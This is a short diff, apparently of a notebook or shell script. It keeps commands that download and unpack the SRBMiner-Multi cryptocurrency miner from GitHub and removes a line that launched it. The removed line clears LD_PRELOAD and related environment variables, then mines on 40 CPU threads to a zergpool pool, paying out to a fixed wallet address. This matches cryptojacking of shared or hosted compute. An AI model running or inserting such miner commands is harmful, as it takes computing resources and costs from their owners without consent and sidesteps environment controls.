@@ -1,4 +1,3 @@
 ! wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.0/SRBMiner-Multi-0-8-0-Linux.tar.xz
 ! tar -xf SRBMiner-Multi-0-8-0-Linux.tar.xz
 ! cd SRBMiner-Multi-0-8-0
-unset LD_PRELOAD && unset LD_LIBRARY_PATH && unset LD_PRELOAD_ENV && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --cpu --threads 40 --wallet ltc1qaua28ac8v5cy8yw7578ykkqu6ru68vat3acj9v -p c=LTC,mc=VRSC,ID=Verus16--threads 40
